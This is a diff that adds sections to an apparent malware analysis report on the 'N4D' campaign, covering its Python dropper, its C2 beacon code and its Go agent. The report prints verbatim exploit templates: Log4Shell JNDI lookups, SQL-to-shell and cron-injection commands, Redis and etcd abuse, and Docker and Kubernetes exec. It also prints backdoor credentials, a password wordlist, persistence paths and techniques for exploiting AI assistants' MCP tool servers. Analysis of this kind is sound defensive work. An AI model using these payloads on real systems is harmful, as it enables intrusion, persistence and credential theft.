+subprocess.<span class="fn">Popen</span>([tf], close_fds=<span class="blu">True</span>)
+os.<span class="fn">remove</span>(<span class="fn">__file__</span>)  <span class="cm"># self-delete after launching Go agent</span></code></pre>
+
+<p>
+  The temp file prefix <code>kworker</code> matches the agent's own process masquerade
+  string (covered in Section 10), maintaining the kernel worker thread illusion
+  even during the handoff from Python to Go.
+</p>
+
+<h3>Beacon Endpoint - v4.0</h3>
+
+<pre><code><span class="cm"># controller_v4.py - lines 690-704</span>
+<span class="hl">@app.get(<span class="st">"/api/beacon"</span>)</span>
+<span class="kw">async def</span> <span class="fn">beacon</span>(req: Request):
+    <span class="st">"""Phone-home endpoint - called by the beacon script at the START of execution.
+    Logs the target's IP, arch, and hostname so we can verify command execution."""</span>
+    ip = req.client.host <span class="kw">if</span> req.client <span class="kw">else</span> <span class="st">"?"</span>
+    arch = req.query_params.<span class="fn">get</span>(<span class="st">"arch"</span>, <span class="st">"?"</span>)
+    hostname = req.query_params.<span class="fn">get</span>(<span class="st">"h"</span>, <span class="st">"?"</span>)
+    port = req.query_params.<span class="fn">get</span>(<span class="st">"p"</span>, <span class="st">"0"</span>)
+    ts = time.<span class="fn">time</span>()
+    <span class="fn">print</span>(
+        <span class="fn">f</span><span class="st">"[BEACON] ip={ip} arch={arch} host={hostname} port={port} ts={ts:.0f}"</span>,
+        flush=<span class="blu">True</span>
+    )
+    <span class="kw">with</span> <span class="fn">db</span>() <span class="kw">as</span> c:
+        cur = c.<span class="fn">cursor</span>()
+        cur.<span class="fn">execute</span>(
+            <span class="st">"INSERT INTO deploys "</span>
+            <span class="st">"(target_ip, target_port, target_server, deployed_by, status, created_at) "</span>
+            <span class="st">"VALUES (%s,%s,%s,%s,%s,%s)"</span>,
+            (ip, <span class="fn">int</span>(port), <span class="st">""</span>, <span class="st">"beacon"</span>, <span class="st">"beacon"</span>, ts)
+        )
+    <span class="kw">return</span> {<span class="st">"ok"</span>: <span class="blu">True</span>}</code></pre>
+
+<p>
+  The beacon logs: target IP (from the connecting socket), CPU architecture (from
+  <code>uname -m</code> in the shell script), hostname, and source port. This gives the
+  operator everything needed to confirm real code execution and prioritize which hosts
+  to follow up on manually. The endpoint is listed in <code>OPEN_ENDPOINTS</code> --
+  it requires no authentication, by design, since the beacon runs before any HMAC
+  key is present on the victim.
+</p>
+
+<p>
+  The beacon URL pattern is: <code>GET /api/beacon?arch=&lt;arch&gt;&amp;h=&lt;hostname&gt;&amp;p=&lt;port&gt;</code>.
+  This pattern appears in network logs as a reliable detection signal for a host
+  actively being compromised.
+</p>
+
+
+<!-- Section 13: Agent Binary Analysis -->
+<h2 id="agent-binary">12. Go Agent Binary — Full Capability Analysis</h2>
+
+<p>
+  Static analysis of the debug build (<code>n4d_debug</code>, 7.3 MB, Jun 26 2026) exposes 170+
+  named Go functions in the <code>main</code> package. Combined with the Python polymorphic
+  builder (<code>build_agent.py</code>), the picture that emerges is a two-tier agent design:
+  a lightweight Python dropper that fetches and executes an obfuscated mesh agent, and a
+  self-contained Go binary that contains the full exploit arsenal.
+</p>
+
+<div class="fig-wrap">
+  <img src="img_agent_binary.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="N4D Go agent binary capability map">
+  <p class="fig-cap">Fig. 9 - N4D Go agent capability map: 170+ named functions organized into six attack categories — AI infrastructure, databases, web/app servers, cloud/infra, persistence, and stealth.</p>
+</div>
+
+<h3>Binary Architecture</h3>
+
+<ul>
+  <li>Language: Go (goroutine-based concurrency, single statically linked binary)</li>
+  <li>Architectures: amd64, arm64, arm, 386 — four simultaneous target platforms</li>
+  <li>Variants: debug build (symbols intact, ~7.3 MB) and stripped release (~7.0 MB)</li>
+  <li>Build sprint: 60+ numbered versions (v152–v176+) compiled on Jun 26 alone</li>
+  <li>Lock file: <code>/dev/shm/.agent.lock</code> and PID in <code>/dev/shm/.agent.pid</code> — prevents double-execution</li>
+</ul>
+
+<h3 id="service-arsenal">Service Probe + Deploy Arsenal (30+ Modules)</h3>
+
+<p>
+  Each target service has a paired <code>probe*</code> / <code>deploy*</code> function.
+  The probe verifies the service is real and not a honeypot; the deploy function executes the
+  appropriate exploit chain and reports back via <code>POST /api/chains/result/</code>.
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Module</th><th>Function pair</th><th>Exploit technique</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Elasticsearch</td><td><code>esDeploy</code></td><td>Groovy script injection via <code>_search</code>; Log4Shell via index doc; Watcher cron persistence via <code>/_watcher/watch/</code></td></tr>
+    <tr><td>Redis</td><td><code>deployRedisAccess</code> / <code>deployRedisCron</code></td><td>Unauthenticated <code>CONFIG SET</code> to write cron jobs; cron drops next-stage agent</td></tr>
+    <tr><td>PostgreSQL</td><td><code>pgDeploy</code> / <code>pgTryPLUDF</code> / <code>pgDblinkPivot</code></td><td><code>COPY TO PROGRAM</code> RCE; PL/Perl UDF code exec; <code>dblink</code> lateral pivot to adjacent hosts</td></tr>
+    <tr><td>MySQL</td><td><code>mysqlDeploy</code> / <code>mysqlTryExploit</code></td><td><code>SELECT INTO OUTFILE</code> cron injection; <code>sys_eval()</code> UDF if available</td></tr>
+    <tr><td>MongoDB</td><td><code>mongoDeploy</code> / <code>mongoWireExploit</code></td><td>Wire-protocol exploit; <code>$where</code> JS eval on older versions; unauthenticated port 27017</td></tr>
+    <tr><td>Docker API</td><td><code>deployDockerAPI</code> / <code>tryDockerSockEscape</code></td><td>Unauthenticated :2375 container creation; <code>/var/run/docker.sock</code> escape to host</td></tr>
+    <tr><td>Kubernetes</td><td><code>k8sDeploy</code> / <code>etcdK8sPodWithToken</code></td><td>Service account token abuse; etcd→K8s pod injection; <code>kubectl</code> execution; daemonset creation</td></tr>
+    <tr><td>Jenkins</td><td><code>deployJenkins</code> / <code>jenkinsScriptConsole</code></td><td>Script console Groovy RCE; <code>/opt/jenkins/secrets/initialAdminPassword</code> read; CLI remoting</td></tr>
+    <tr><td>Nacos</td><td><code>deployNacos</code> / <code>probeNacos</code></td><td>Unauthenticated config API (<code>/nacos/v1/cs/configs</code>); auth bypass user listing; re-access via backdoor account (<code>POST /nacos/v1/auth/login</code>, form-body: <code>username=n4d_admin&amp;password=n4d_admin123</code>)</td></tr>
+    <tr><td>Spring Gateway</td><td><code>deploySpringGateway</code></td><td>Actuator <code>/actuator/gateway/routes/</code> SSRF/RCE (CVE-2022-22947)</td></tr>
+    <tr><td>WebLogic</td><td><code>deployWebLogic</code></td><td>JNDI injection via <code>handle</code> parameter; <code>${T(java.lang.Runtime)}</code> SpEL</td></tr>
+    <tr><td>Consul</td><td><code>consulDeploy</code></td><td>Unauthenticated script health-check registration → RCE</td></tr>
+    <tr><td>XXL-Job</td><td><code>deployXXLJob</code></td><td>Glue source code execution via executor API</td></tr>
+    <tr><td>Airflow</td><td><code>deployAirflow</code></td><td>Unauthenticated API DAG trigger; forged Flask session cookie</td></tr>
+    <tr><td>Superset</td><td><code>deploySuperset</code> / <code>buildSupersetPickle</code></td><td>Default secret key Flask cookie forgery; <strong>Python pickle deserialization RCE</strong></td></tr>
+    <tr><td>Splunk</td><td><code>deploySplunk</code></td><td>Custom search command injection; cron persistence via <code>/etc/cron.d/splunk_health</code></td></tr>
+    <tr><td>MinIO</td><td><code>deployMinIO</code></td><td>Default credentials access; object storage enumeration</td></tr>
+    <tr><td>RabbitMQ</td><td><code>rabbitmqDeploy</code></td><td>Default <code>guest:guest</code> credentials; shovel plugin RCE via management API</td></tr>
+    <tr><td>ActiveMQ</td><td><code>activemqDeploy</code></td><td>Remote code deployment via ActiveMQ XML configuration endpoint</td></tr>
+    <tr><td>Rclone RCD</td><td><code>deployRcloneRCD</code></td><td>Unauthenticated Rclone remote control daemon; arbitrary file read/write via <code>/rc/listhttp</code></td></tr>
+    <tr><td>Nginx UI</td><td><code>deployNginxUI</code> / <code>deployNginxUIChain</code></td><td>PTY access via <code>/api/pty</code> WebSocket; path traversal to <code>/etc/chromium.d/sys_alias</code></td></tr>
+    <tr><td>etcd</td><td><code>deployEtcd</code></td><td>Unauthenticated etcd v2/v3 key read; K8s secret extraction from <code>/registry/secrets/</code></td></tr>
+    <tr><td>MCP (3 types)</td><td><code>deployMCPFileRead</code> / <code>deployMCPShell</code> / <code>deployMCPSQL</code></td><td>File read, shell execution, SQL execution via MCP tool calls (see Section 03)</td></tr>
+    <tr><td>AKS MCP</td><td><code>exploitAKSMCP</code></td><td>Azure Kubernetes Service MCP server exploitation — cloud + AI tooling combined attack</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Primary Attack Vector: MCP Protocol Exploitation</h3>
+
+<p>
+  <strong>Model Context Protocol (MCP) servers</strong> are the critical entry vector with zero authentication requirements.
+  MCP is Anthropic's JSON-RPC protocol for connecting AI assistants to external tools. The agent implements a generic MCP
+  client that discovers exposed servers, enumerates their tool catalogs, and exploits dangerous tools (<code>execute_command</code>,
+  <code>read_file</code>, <code>query_database</code>, Kubernetes calls) without needing prior knowledge of specific implementations.
+  Post-exploitation, the agent deploys 30+ specialized modules targeting databases, containers, Kubernetes, and other infrastructure
+  services. See <a href="#service-arsenal" style="color:var(--blue);">Service Probe + Deploy Arsenal</a> for the complete attack chain and Section 13 for AI platform targeting.
+</p>
+
+<h3>Credential Harvesting</h3>
+
+<p>
+  The <code>main.harvestCreds</code> function has 4 independent sub-routines and is the
+  primary intelligence collection entry point. <code>main.mcpCredHarvest</code> handles
+  MCP-specific credential extraction. Per-service intel functions include
+  <code>pgGatherIntel</code>, <code>mysqlGatherIntel</code>, <code>mongoGatherIntel</code>,
+  and <code>mongoGatherIntelNoAuth</code>.
+</p>
+<p>
+  Additional collection paths: <code>decryptBackupAndExtractSecret</code> (attempts to
+  decrypt encrypted backup archives), <code>extractNodeSecretFromIni</code> (reads INI-format
+  config files for secrets), <code>tryDecryptZipEntries</code> (targets password-protected
+  ZIP archives), and <code>jenkinsReadFile</code> (reads arbitrary files via Jenkins workspace API).
+</p>
+
+<h3>Persistence — Six Independent Mechanisms</h3>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Function</th><th>Path / Method</th><th>Survives</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>installPersistence</code> (cron)</td><td><code>/etc/cron.d/.sys-health</code>, <code>/etc/cron.d/.syscheck</code></td><td>Reboot, login shell restart</td></tr>
+    <tr><td><code>installBashrc</code></td><td><code>/root/.bashrc</code> append</td><td>Every interactive shell spawn</td></tr>
+    <tr><td><code>installSystemd</code></td><td>Systemd unit (service name obscured)</td><td>Reboot, service restart</td></tr>
+    <tr><td><code>installSSHKey</code></td><td><code>~/.ssh/authorized_keys</code></td><td>Operator direct access — independent of agent</td></tr>
+    <tr><td><code>installWatchdog</code></td><td>Watchdog process monitors agent; restarts on death</td><td>Process kill, timeout</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  A sixth path was found in the binary: <code>/etc/profile.d/sys_alias.sh</code>, written
+  by the Nginx UI and Grafana deploy modules as a login-trigger payload.
+</p>
+
+<h3>Stealth &amp; Anti-Forensics</h3>
+
+<ul>
+  <li><code>initHardening</code> — initializes anti-debug and anti-ptrace checks at startup</li>
+  <li><code>setProcName</code> — renames the process in <code>/proc/self/cmdline</code> to masquerade as a legitimate system process</li>
+  <li><code>stealthHeaders</code> / <code>stealthUA</code> — randomizes HTTP headers and User-Agent per request</li>
+  <li><code>stealthDelayBeforeProbe</code> — inserts randomized delay before service probing to avoid pattern detection</li>
+  <li><code>stealthRST</code> — sends TCP RST after probing to prevent connection log entries</li>
+  <li><code>cleanupTraces</code> — deletes logs, temp files, and execution artifacts post-operation</li>
+  <li><code>cleanOldBinaries</code> — removes previous agent binary versions from disk</li>
+</ul>
+
+<h3>Network Propagation: CIDR and Lateral Scanning</h3>
+
+<p>
+  Two dedicated scanning goroutine clusters drive C2-directed network propagation via operator-tasked reconnaissance. <code>main.scanCIDR</code>
+  accepts CIDR blocks from the controller's task queue and fans out parallel probes across the entire range
+  (confirmed: 5 concurrent goroutine functions in the debug build). <code>main.scanLateral</code> operates
+  on locally derived target sets — it reads ARP tables, /etc/hosts, and SSH known_hosts entries from the
+  current host and probes adjacent addresses on the same subnet without waiting for a per-task C2 assignment.
+  The combination means a newly compromised host begins lateral scanning automatically within seconds after C2 task assignment,
+  independent of waiting for further per-step confirmation.
+</p>
+
+<h3>Honeypot Detection Engine</h3>
+
+<p>
+  The agent has a score-based honeypot detection system with five dedicated functions:
+  <code>hpScoreIP</code>, <code>hpAddScore</code>, <code>hpBlacklistCheck</code>,
+  <code>hpIsBlacklisted</code>, <code>hpCheckMultiService</code>, and <code>hpVerifyDeploy</code>.
+  Targets scoring above a threshold are blacklisted and skipped. The Elasticsearch probe
+  checks for the string <code>es-no-real-data-possible-honeypot</code> as a honeypot signal.
+  Result type strings <code>es_hp_suspect</code>, <code>docker_hp_suspect</code>, and
+  <code>consul_hp_suspect</code> are reported back to the C2 to update the global blacklist.
+</p>
+
+<h3>Cloudflare Quick Tunnel Mesh</h3>
+
+<p>
+  The string <code>.trycloudflare.com</code> and the function <code>main.startMeshTunnel</code>
+  confirm that agents can establish outbound <strong>Cloudflare Quick Tunnels</strong> —
+  anonymous, certificate-signed HTTPS tunnels at randomly-assigned <code>*.trycloudflare.com</code>
+  subdomains. This provides a C2 relay path that requires no domain registration, no
+  static IP, and generates TLS traffic indistinguishable from legitimate Cloudflare traffic.
+  The <code>main.startRelay</code> function likely uses this channel to allow operators to
+  reach agents behind NAT or firewall with no inbound port requirements.
+</p>
+
+<h3>Interactive PTY / WebSocket Shell</h3>
+
+<p>
+  The binary contains a full WebSocket implementation (<code>wsDial</code>, <code>wsSendText</code>,
+  <code>makeWSFrame</code>, <code>makeWSBinaryFrame</code>) and connects to the C2 endpoint
+  <code>/api/pty</code>. This gives operators an interactive pseudo-terminal session through
+  the C2 web interface. The <code>nginx_ui_pty</code> result type and the Nginx UI exploit
+  chain (<code>deployNginxUIChain</code>) also grant PTY access on the <em>target</em> side
+  through the same WebSocket mechanism.
+</p>
+
+<h3>Embedded Credential Wordlist — Full Extraction</h3>
+
+<p>
+  String extraction from the binary reveals two distinct credential sets: a generic
+  brute-force password wordlist used across all services, and service-specific
+  default credentials hardcoded per exploit module.
+</p>
+
+<h4>Generic Password Wordlist</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>Password</th><th>Likely Targets</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">password</td><td>PostgreSQL, MySQL, RabbitMQ, Redis, generic</td></tr>
+    <tr><td class="mono">admin123</td><td>MySQL, Nacos, XXL-Job, web panels</td></tr>
+    <tr><td class="mono">P@ssw0rd</td><td>MySQL, MSSQL, PostgreSQL</td></tr>
+    <tr><td class="mono">changeme</td><td>Jenkins, Grafana, generic defaults</td></tr>
+    <tr><td class="mono">Qwer1234</td><td>Generic enterprise, web panels</td></tr>
+    <tr><td class="mono">minio123</td><td>MinIO object storage</td></tr>
+    <tr><td class="mono">mysql123</td><td>MySQL root / app users</td></tr>
+    <tr><td class="mono">tutorial</td><td>Superset, Airflow demo instances</td></tr>
+    <tr><td class="mono">root123</td><td>FastGPT, generic root users</td></tr>
+    <tr><td class="mono">123456</td><td>Grafana Renderer default, generic</td></tr>
+    <tr><td class="mono">postgres2024</td><td>PostgreSQL (year-stamped, updated annually)</td></tr>
+    <tr><td class="mono">postgres2025</td><td>PostgreSQL (year-stamped, updated annually)</td></tr>
+    <tr><td class="mono">Postgres@123</td><td>PostgreSQL</td></tr>
+    <tr><td class="mono">postgrespass</td><td>PostgreSQL</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>Service-Specific Hardcoded Credentials</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>Service</th><th>Credential / Secret</th><th>Attack vector</th></tr></thead>
+  <tbody>
+    <tr><td>Nacos (backdoor re-access)</td><td class="mono">n4d_admin : n4d_admin123</td><td>Posted via <code>main.deployNacos</code> to <code>POST /nacos/v1/auth/login</code> (form-urlencoded: <code>username=n4d_admin&amp;password=n4d_admin123</code>); operators create this backdoor account on initially compromised Nacos nodes then use the credential to re-authenticate and deploy the agent on return visits — confirmed by RIP-relative LEA disassembly tracing the string to <code>main.deployNacos</code> in the debug build</td></tr>
+    <tr><td>Grafana Renderer</td><td class="mono">userName=admin&amp;password=123456</td><td>Login endpoint (<code>/login</code>); also harvests <code>grafana_renderer_default_token</code></td></tr>
+    <tr><td>Kubernetes</td><td class="mono">bootstrap-token.abcdef0123456789</td><td>K8s bootstrap token for API server auth during cluster enumeration</td></tr>
+    <tr><td>Spring Gateway</td><td class="mono">abcdef.0123456789abcdef</td><td>Service account token injected in actuator bypass routes</td></tr>
+    <tr><td>Superset</td><td class="mono">superset_default_key</td><td>Flask <code>SECRET_KEY</code> — forges admin session cookies via <code>itsdangerous</code></td></tr>
+    <tr><td>RabbitMQ</td><td class="mono">rabbitmq_default_creds</td><td>Management API (<code>/api/overview</code>) with default <code>guest:guest</code></td></tr>
+    <tr><td>MinIO</td><td class="mono">minio_default_creds + MINIO_ROOT_PASSWORD env harvest</td><td>Bootstrap verify endpoint + env var scrape from container metadata</td></tr>
+    <tr><td>XXL-Job</td><td class="mono">xxl_job_default_creds</td><td>Login endpoint (<code>/xxl-job-admin/login</code>), then job injection RCE</td></tr>
+    <tr><td>FastGPT</td><td class="mono">root123</td><td>Code-server backend (<code>/api/jobs/fastgpt_codeserver_rce</code>)</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  The year-stamped PostgreSQL passwords (<code>postgres2024</code>, <code>postgres2025</code>)
+  confirm the wordlist is actively maintained. A <code>postgres2026</code> entry should be
+  expected in future builds.
+</p>
+
+<h3>Exploit URL Templates — Full Extraction</h3>
+
+<p>
+  Each exploit module uses a hardcoded URL template with <code>%s:%d</code> (host:port)
+  substitution. The following templates were extracted verbatim from the binary and grouped
+  by targeted service.
+</p>
+
+<h4>Elasticsearch / OpenSearch</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>URL Template</th><th>Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">http://%s:%d/_search?q=${jndi:ldap://%s/a}</td><td>Log4Shell via ES search parameter</td></tr>
+    <tr><td class="mono">http://%s:%d/${jndi:ldap://%s/a}/_doc</td><td>Log4Shell via document index path</td></tr>
+    <tr><td class="mono">http://%s:%d/_scripts/groovy</td><td>Groovy dynamic script RCE (ES 1.x)</td></tr>
+    <tr><td class="mono">http://%s:%d/_search/template</td><td>Search template injection</td></tr>
+    <tr><td class="mono">http://%s:%d/_watcher/watch/sys-check/_execute</td><td>ES Watcher — schedule curl/sh payload</td></tr>
+    <tr><td class="mono">http://%s:%d/_ingest/pipeline/sys-health</td><td>Ingest pipeline script processor RCE</td></tr>
+    <tr><td class="mono">http://%s:%d/_sql</td><td>ES SQL endpoint — info gathering</td></tr>
+    <tr><td class="mono">http://%s:%d/_snapshot/sysbackup</td><td>Snapshot restore → file write path</td></tr>
+    <tr><td class="mono">http://%s:%d/_cat/indices?v&amp;h=index,docs.count,store.size</td><td>Index enumeration</td></tr>
+    <tr><td class="mono">http://%s:%d/_bulk</td><td>Bulk index injection</td></tr>
+    <tr><td class="mono">http://%s:%d/_cluster/settings</td><td>Cluster config enumeration</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>PostgreSQL</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>SQL / URL</th><th>Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">COPY (SELECT 1) TO PROGRAM '%s'</td><td>COPY TO PROGRAM — direct OS command execution as postgres user</td></tr>
+    <tr><td class="mono">SELECT lo_import('/usr/bin/curl', 99998)</td><td>Large object import — smuggle curl binary via SQL</td></tr>
+    <tr><td class="mono">SELECT lo_export(lo_from_bytea(0, E'\x%s'), '/tmp/.n4d_pg.sh')</td><td>Large object export — write payload script from hex bytes</td></tr>
+    <tr><td class="mono">COPY (SELECT '%s') TO '/etc/cron.d/.syscheck'</td><td>Cron injection via COPY superuser privilege</td></tr>
+    <tr><td class="mono">CREATE OR REPLACE FUNCTION _sys_chk() RETURNS void AS $$ ... $$ LANGUAGE plperl</td><td>PL/Perl UDF — exec arbitrary OS commands</td></tr>
+    <tr><td class="mono">SELECT dblink_connect('%s'); SELECT * FROM dblink_connect()</td><td>dblink lateral pivot to other PostgreSQL instances</td></tr>
+    <tr><td class="mono">SELECT usename, passwd FROM pg_shadow</td><td>Password hash dump</td></tr>
+    <tr><td class="mono">SELECT name, setting FROM pg_settings WHERE name IN ('data_directory','hba_file',...)</td><td>Config path enumeration for follow-on file-write attacks</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>MySQL / MariaDB</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>SQL</th><th>Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">SELECT '%s' INTO OUTFILE '/etc/cron.d/.syscheck'</td><td>FILE privilege → direct cron write</td></tr>
+    <tr><td class="mono">SELECT '%s' INTO OUTFILE '/var/lib/mysql-files/.deploy.sh'</td><td>FILE privilege → secure_file_priv bypass via allowed dir</td></tr>
+    <tr><td class="mono">SELECT '%s' INTO DUMPFILE '/var/lib/mysql-files/.deploy.sh'</td><td>DUMPFILE variant (binary-safe)</td></tr>
+    <tr><td class="mono">CREATE EVENT IF NOT EXISTS _sys_check ON SCHEDULE EVERY 1 MINUTE DO SELECT sys_exec('%s')</td><td>Event scheduler + sys_exec UDF for persistent execution</td></tr>
+    <tr><td class="mono">CREATE TRIGGER sys_trig BEFORE INSERT ON sys_tmp FOR EACH ROW BEGIN SET @cmd=sys_exec('%s'); END</td><td>Trigger-based RCE via sys_exec UDF</td></tr>
+    <tr><td class="mono">EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; EXEC xp_cmdshell '%s'</td><td>MSSQL xp_cmdshell enable + execute</td></tr>
+    <tr><td class="mono">SELECT user, host, authentication_string FROM mysql.user</td><td>MySQL 8.x hash dump</td></tr>
+    <tr><td class="mono">SELECT table_schema,table_name FROM information_schema.tables</td><td>Schema enumeration before credential/data harvest</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>MongoDB</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>URL / Command</th><th>Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">http://%s:28017/admin/$cmd/?filter_eval=%s</td><td>MongoDB REST API eval — arbitrary JS execution (MongoDB &lt;3.6)</td></tr>
+    <tr><td class="mono">http://%s:28017/file_write_shell</td><td>REST API file write path</td></tr>
+    <tr><td class="mono">function(){ try { os.system('%s'); } catch(e) { ... } return 1; }</td><td>JS payload injected via filter_eval</td></tr>
+    <tr><td class="mono">db.adminCommand({serverStatus:1})</td><td>Honeypot detection probe — legitimate servers respond, honeypots often don't</td></tr>
+    <tr><td class="mono">system.users / collections_system_users</td><td>Credential collection targets via <code>listCollections</code></td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>Redis</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>Command</th><th>Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">CONFIG SET dir /var/spool/cron/crontabs</td><td>Redis cron injection — write cron tab via Redis persistence</td></tr>
+    <tr><td class="mono">CONFIG SET dbfilename root</td><td>Set dump filename to "root" in /var/spool/cron/</td></tr>
+    <tr><td class="mono">SET x %s / BGSAVE</td><td>Write payload content then trigger background save</td></tr>
+    <tr><td class="mono">FLUSHALL</td><td>Clear keyspace before writing payload to avoid noise</td></tr>
+    <tr><td class="mono">os.execute('chmod +x /tmp/.n4d_redis.sh &amp;&amp; /tmp/.n4d_redis.sh &amp;') return 1 end return 0</td><td>Lua script payload executed via EVAL command</td></tr>
+    <tr><td class="mono">*2·$3·GET / *2·$3·DEL</td><td>Raw RESP protocol frames — bypasses client library detection</td></tr>
+    <tr><td class="mono">redis-accepts-any-password</td><td>Internal flag marking unauthenticated Redis instances for auto-exploit</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>Kubernetes / etcd / Cloud</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>URL Template</th><th>Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">https://%s:%d/api/v1/pods?fieldSelector=status.phase=Running</td><td>List running pods — target selection</td></tr>
+    <tr><td class="mono">https://%s:%d/exec/%s/%s/%s?command=sh&amp;command=-c&amp;command=%s&amp;output=1</td><td>Pod exec — arbitrary command in running container</td></tr>
+    <tr><td class="mono">http://%s:%d/v2/keys/registry/secrets?recursive=true</td><td>etcd v2 — dump all Kubernetes secrets (API tokens, TLS certs)</td></tr>
+    <tr><td class="mono">http://%s:%d/v2/keys/registry/pods/default/sys-health-check</td><td>etcd v2 — inject privileged pod definition</td></tr>
+    <tr><td class="mono">http://%s:%d/v3/kv/put / /v3/kv/range</td><td>etcd v3 gRPC-gateway — read/write all cluster state</td></tr>
+    <tr><td class="mono">http://%s:%d/containers/create?name=sys-health-monitor</td><td>Docker API — create privileged container</td></tr>
+    <tr><td class="mono">http://%s:%d/containers/%s/exec</td><td>Docker API — exec in existing container</td></tr>
+    <tr><td class="mono">nicolaka/netshoot:latest</td><td>Network diagnostic container deployed for internal subnet scanning</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>Web / App Servers</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>URL Template</th><th>Service / Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">http://%s:%d/scriptText</td><td>Jenkins Script Console — Groovy RCE</td></tr>
+    <tr><td class="mono">http://%s:%d/cli</td><td>Jenkins CLI endpoint</td></tr>
+    <tr><td class="mono">http://%s:%d/console/console.portal?_nfpb=true&amp;...java.lang.Runtime</td><td>WebLogic Admin Console JNDI/RMI injection</td></tr>
+    <tr><td class="mono">http://%s:%d/actuator/gateway/routes/sys_health_check</td><td>Spring Cloud Gateway actuator route injection → SPEL RCE</td></tr>
+    <tr><td class="mono">http://%s:%d/actuator/jolokia / /actuator/env / /actuator/refresh</td><td>Spring Boot actuator chain — env leak + SPEL injection</td></tr>
+    <tr><td class="mono">http://%s:%d/nacos/v1/cs/configs?dataId=&amp;group=&amp;pageNo=1&amp;pageSize=10</td><td>Nacos unauthenticated config dump</td></tr>
+    <tr><td class="mono">http://%s:%d/nacos/v1/auth/users?pageNo=1&amp;pageSize=10</td><td>Nacos unauthenticated user enumeration</td></tr>
+    <tr><td class="mono">http://%s:%d/xxl-job-admin/login → /xxl-job-admin/jobinfo/add</td><td>XXL-Job default creds login + Groovy job injection</td></tr>
+    <tr><td class="mono">http://%s:%d/api/experimental/dags/%s/dag_runs</td><td>Apache Airflow unauthenticated DAG trigger (v1 API)</td></tr>
+    <tr><td class="mono">http://%s:%d/api/v1/dags/%s/dagRuns</td><td>Apache Airflow v2 API DAG run injection</td></tr>
+    <tr><td class="mono">http://%s:%d/en-US/splunkd/__raw/v1/postgres/recovery/restore</td><td>Splunk PostgreSQL restore — arbitrary file write as splunk user</td></tr>
+    <tr><td class="mono">http://%s:%d/api/parameters/rabbitmq_exec/%%2F/sys-check</td><td>RabbitMQ management API exec plugin — command execution</td></tr>
+    <tr><td class="mono">http://%s:%d/api/parameters/shovel/%%2F/sys-check</td><td>RabbitMQ Shovel plugin — message forwarding abuse for RCE</td></tr>
+    <tr><td class="mono">http://%s:%d/v1/agent/service/register</td><td>Consul unauthenticated service registration — health check RCE</td></tr>
+    <tr><td class="mono">http://%s:%d/rc/command / /rc/list / /fs/exec</td><td>Rclone RC API — arbitrary filesystem operations</td></tr>
+    <tr><td class="mono">http://localhost/","filePath":"../../etc/chromium.d/sys_alias"}</td><td>Nginx UI path traversal — write to arbitrary config path</td></tr>
+    <tr><td class="mono">http://%s:%d/minio/bootstrap/v1/verify → /login/</td><td>MinIO bootstrap verify + credential bruteforce</td></tr>
+    <tr><td class="mono">http://%s:%d/render/csv</td><td>Grafana Image Renderer SSRF → arbitrary file read</td></tr>
+    <tr><td class="mono">http://%s:%d/api/upload/plugin</td><td>Grafana unauthenticated plugin upload (older builds)</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>AI / ML Infrastructure</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>URL Template</th><th>Service / Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">https://%s:%d/run/%s/%s/%s</td><td>Ray Dashboard — job submission with arbitrary <code>bash -c</code> entrypoint</td></tr>
+    <tr><td class="mono">http://%s:%d/api/jobs/fastgpt_codeserver_rce</td><td>FastGPT code-server backend — no-auth code execution</td></tr>
+    <tr><td class="mono">http://%s:%d/pickle</td><td>LightLLM inference server — pickle deserialization RCE endpoint</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h4>General-Purpose & Notebook Tools</h4>
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>URL Template</th><th>Service / Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">http://%s:%d/api/kernels → /api/kernels/%s/channels</td><td>Jupyter — list kernels then open WebSocket to execute code</td></tr>
+    <tr><td class="mono">http://%s:%d/api/kernelspecs</td><td>Jupyter Gateway — spec enumeration, reveals kernel types</td></tr>
+    <tr><td class="mono">{"name":"python_kubernetes","env":{"KERNEL_POD_NAME":"test-%s","KERNEL_NAMESPACE":"default"}}</td><td>Jupyter Enterprise Gateway — spawn kernel pod in default namespace with attack payload</td></tr>
+    <tr><td class="mono">http://%s:%d/mcpcontext</td><td>MCP server root — session initiation probe</td></tr>
+    <tr><td class="mono">http://%s:%d/api/v1/database/</td><td>Superset DB connection API — credential leak via connection test</td></tr>
+  </tbody>
+</table>
+</div>
+
